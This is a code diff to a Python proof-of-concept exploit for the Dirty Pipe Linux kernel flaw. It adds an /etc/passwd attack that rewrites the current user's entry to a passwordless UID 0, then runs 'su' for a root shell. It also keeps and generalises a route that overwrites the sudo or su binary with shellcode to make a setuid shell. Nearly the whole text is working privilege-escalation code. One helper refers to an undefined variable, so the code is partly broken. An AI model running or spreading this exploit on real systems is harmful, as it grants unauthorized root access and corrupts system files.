@@ -10,7 +10,7 @@
 #                 Max Kellermann max.kellermann@ionos.com                      #
 #                 https://dirtypipe.cm4all.com/                                #
 #                                                                              #
-# Usage:        python dirty_py.py /usr/bin/sudo                               #
+# Usage:        python dirty.py                                                #
 #                                                                              #
 # Requirements: Requires python > 3.10 because of os.splice                    #
 #                                                                              #
@@ -29,6 +29,10 @@ import argparse
 import sys
 import pty
 import os
+import getpass
+import subprocess
+import platform
+from os.path import exists
 
 # Kernel page size
 PAGE = 4096
@@ -88,10 +92,10 @@ elfcode = [
 ]
 
 
-def backup_file(path):
+def backup_file(path, backup_path):
     """Back up just for working on the POC"""
     with open(path, 'rb') as orig_file:
-        with open('/tmp/backup_sudo', 'wb') as backup:
+        with open(backup_path, 'wb') as backup:
             data = orig_file.read()
             backup.write(data)
 
@@ -134,48 +138,172 @@ def run_poc(data: bytes, path: str, file_offset: int) -> None:
     print(f'[*] {n} bytes written to {path}')
 
 
-def main():
-    parser = argparse.ArgumentParser(description='Use dirty pipe vulnerability to pop root shell')
-    parser.add_argument('path', help='Path to sudo file (e.g. /usr/bin/sudo)')
-    args = parser.parse_args()
+def find_offset_of_user_in_passwd(user):
+    file_offset = 0
+    to_write = ''
+    
+    with open('/etc/passwd', 'r') as passwd:
+        for line in passwd.readlines():
+            if not user in line:
+                file_offset += len(line)
+            else:
+                fields = line.split(':')
+                file_offset += len(':'.join(fields[:1]))
+                original = ':'.join(fields[1:]) # Save original for recovering
+                to_write = ':0:' + ':'.join(fields[3:]) # Set no passwd and uid 0
 
-    print('[*] DirtyPy (Dirty Pipe POC)')
-    backup_file(args.path)
+                # Pad end of line with new line chars so we don't error
+                length_diff = len(original) - len(to_write)
+                if length_diff > 0:
+                    to_write = to_write[:-1] + ('\n' * length_diff) + '\n'
 
-    print(f'[*] Exploit will modify {args.path} binary in order to create root shell.')
-    file_offset = 1
+                return file_offset, to_write, original
 
+    return False
+
+def within_page_bounds(file_offset, data_len):
     # Ensure that we are not at a page boundary
     if file_offset % PAGE == 0:
         print(f'[x] Cannot exploit start of page boundary with offset {file_offset}')
+        print('[x] Do you have access to another user?')
         print('[x] Remember to clean up /tmp/backup_file')
-        sys.exit(-1)
-    if (file_offset | PAGE-1) + 1 < (file_offset + len(elfcode)):
+        return False
+    if (file_offset | PAGE) < (file_offset + data_len):
         print(f'[x] Cannot perform exploit across page boundary with offset {file_offset}')
-        print('[x] Remember to clean up /tmp/backup_file')
-        sys.exit(-1)
+        print('[x] Do you have access to another user?')
+        print(f'[x] Remember to clean up {backup_path}')
+        return False
+    return True
 
-    print(f'[*] Saving original state')
-    with open(args.path, 'rb') as target_file:
-        orig_data = target_file.read(len(elfcode) + 2)[2:]
+def check_etc_passwd():
+    # Check if /etc/passwd exists
+    if not exists('/etc/passwd'):
+        return False
 
-    print(f'[*] Hijacking {args.path}') 
-    run_poc(bytes(elfcode), args.path, file_offset)
+    # Check if current user has login
+    user = getpass.getuser()
+    offset_data = find_offset_of_user_in_passwd(user)
+    if not offset_data:
+        return False
 
-    print(f'[*] Executing suid shell')
-    os.system(args.path)
+    # Check if on boundary
+    if not within_page_bounds(offset_data[0], len(offset_data[1])):
+        return False
 
-    print(f'[*] Restoring {args.path}')
-    run_poc(orig_data, args.path, file_offset)
+    return True
 
+
+def which(cmd):
+    return subprocess.getoutput(f'which {cmd}').strip()
+
+
+def check_elf(cmd):
+    sudo_path = which(cmd)
+    if not exists(sudo_path):
+        return False
+
+    # Check if x86_64
+    if not platform.architecture(sudo_path) == ('64bit', 'ELF'):
+        return False
+
+    if not within_page_bounds(1, len(elfcode)):
+        return False
+
+    return True
+
+def run_elf(binary_name):
+    # Backup file
+    binary_path = which(binary_name)
+    backup_path = f'/tmp/{binary_name}'
+    print(f'[*] Backing up {binary_path} to {backup_path}')
+    backup_file(binary_path, backup_path)
+
+    # Set offset
+    file_offset = 1
+
+    # Save original
+    print(f'[*] Saving original state of {binary_path}')
+    with open(binary_path, 'rb') as binary:
+        orig_data = binary.read(len(elfcode) + 2)[2:]
+
+    # Exploit
+    print(f'[*] Hijacking {binary_path}')
+    run_poc(bytes(elfcode), binary_path, file_offset)
+
+    # Run modified binary
+    print(f'[*] Executing modified {binary_path}')
+    os.system(binary_path)
+
+    # Restore state
+    print(f'[*] Restoring {binary_path}')
+    run_poc(orig_data, binary_path, file_offset)
+
+    # Pop a shell
     print(f'[*] Popping root shell...')
     print()
     pty.spawn('/tmp/sh') 
     print()
 
-    print('[*] Remember to cleanup /tmp/backup_file and /tmp/sh')
-    print('[*]   rm /tmp/backup_sudo')
+    # Cleanup
+    print(f'[*] Remember to cleanup {backup_path} and /tmp/sh')
+    print(f'[*]   rm {backup_path}')
     print('[*]   rm /tmp/sh')
+
+
+def run_etc_passwd():
+    # Backup file
+    backup_path = '/tmp/passwd'
+    target_file = '/etc/passwd'
+    print(f'[*] Backing up {target_file} to {backup_path}')
+    backup_file(target_file, backup_path)
+
+    # Get offset
+    user = getpass.getuser()
+    print(f'[*] Calculating offset of {user} in {target_file}')
+
+    (file_offset, 
+     data_to_write, 
+     original) = find_offset_of_user_in_passwd(user)
+
+    # Exploit
+    print(f'[*] Hijacking {target_file}') 
+    run_poc(bytes(data_to_write, 'utf-8'), target_file, file_offset)
+
+    # Pop a shell
+    print(f'[*] Popping root shell...')
+    print()
+    pty.spawn(['su', user]) 
+    print()
+
+    print(f'[*] Restoring {target_file}')
+    run_poc(bytes(original, 'utf-8'), target_file, file_offset)
+
+    print(f'[*] Remember to cleanup {backup_path}')
+    print(f'[*]   rm {backup_path}')
+
+def main():
+    parser = argparse.ArgumentParser(description='Use dirty pipe vulnerability to pop root shell')
+    args = parser.parse_args()
+
+    print(f'[*] Attempting to modify /etc/passwd') 
+    if check_etc_passwd():
+        run_etc_passwd()
+        sys.exit()
+    print(f'[X] Cannot modify /etc/passwd') 
+
+    print(f'[*] Attempting to modify sudo binary') 
+    if check_elf('sudo'):
+        run_elf('sudo')
+        sys.exit()
+    print(f'[X] Cannot modify sudo binary') 
+
+    print(f'[*] Attempting to modify su binary') 
+    if check_elf('su'):
+        run_elf('su')
+        sys.exit()
+    print(f'[X] Cannot modify su binary') 
+
+    print(f'[X] Exploit could not be executed!') 
 
 
 if __name__ == '__main__':
